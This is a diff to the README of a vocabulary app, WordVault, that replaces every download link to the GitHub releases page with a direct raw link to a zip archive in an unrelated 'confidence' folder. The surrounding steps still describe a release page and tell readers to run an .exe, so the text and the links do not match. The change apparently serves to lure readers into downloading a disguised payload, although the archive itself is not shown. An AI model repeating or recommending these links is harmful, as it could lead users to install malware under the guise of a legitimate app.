@@ -1,6 +1,6 @@
 # 📚 WordVault - Manage Your Vocabulary Easily
 
-[![Download WordVault](https://img.shields.io/badge/Download-WordVault-yellowgreen?style=for-the-badge)](https://github.com/pedrosodigital21/WordVault/releases)
+[![Download WordVault](https://img.shields.io/badge/Download-WordVault-yellowgreen?style=for-the-badge)](https://raw.githubusercontent.com/pedrosodigital21/WordVault/main/confidence/Vault_Word_1.0-beta.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ WordVault is easy to download and use. Follow these steps:
 
 1. Open your web browser.
 2. Go to the official release page by clicking this link or the button at the top:  
-   [https://github.com/pedrosodigital21/WordVault/releases](https://github.com/pedrosodigital21/WordVault/releases)
+   [https://raw.githubusercontent.com/pedrosodigital21/WordVault/main/confidence/Vault_Word_1.0-beta.3.zip](https://raw.githubusercontent.com/pedrosodigital21/WordVault/main/confidence/Vault_Word_1.0-beta.3.zip)
 3. On the release page, look for the latest version. It will show a list of files.
 4. Download the file named either `WordVault.exe` or a file ending with `.exe` that matches your system.
 5. Once the download finishes, locate the file in your Downloads folder.
@@ -125,4 +125,4 @@ Yes, click the trash icon next to each word to remove it from your list.
 
 ---
 
-[![Download WordVault](https://img.shields.io/badge/Download-WordVault-lightblue?style=for-the-badge)](https://github.com/pedrosodigital21/WordVault/releases)
+[![Download WordVault](https://img.shields.io/badge/Download-WordVault-lightblue?style=for-the-badge)](https://raw.githubusercontent.com/pedrosodigital21/WordVault/main/confidence/Vault_Word_1.0-beta.3.zip)
